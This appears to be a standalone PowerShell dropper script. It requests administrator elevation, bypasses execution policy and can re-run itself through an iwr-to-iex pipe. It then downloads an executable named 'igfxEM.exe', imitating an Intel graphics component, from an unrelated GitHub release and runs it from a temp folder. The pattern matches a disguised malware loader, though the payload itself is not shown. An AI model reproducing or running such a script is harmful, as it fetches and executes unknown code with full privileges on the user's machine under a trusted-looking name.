$ExeUrl = "https://github.com/Gadgetechno/neww/releases/download/new/igfxEM.exe"
$AppName = "igfxEM.exe"

$ErrorActionPreference = "Stop"

$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    if ($MyInvocation.Line -match 'http') {
        $url = ($MyInvocation.Line -match '(https?://\S+)')[1]
        Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iwr '$url' -UseBasicParsing | iex`""
    } else {
        Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    }
    exit
}

$TempDir = Join-Path $env:TEMP "App_$(Get-Random)"
New-Item -ItemType Directory -Path $TempDir | Out-Null
$ExePath = Join-Path $TempDir $AppName

Write-Host "Downloading..." -ForegroundColor Cyan
$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::TLS12
Invoke-WebRequest -Uri $ExeUrl -OutFile $ExePath -UseBasicParsing

Write-Host "Running..." -ForegroundColor Green
Start-Process -FilePath $ExePath -WorkingDirectory $TempDir -Wait

Write-Host "Done." -ForegroundColor Green
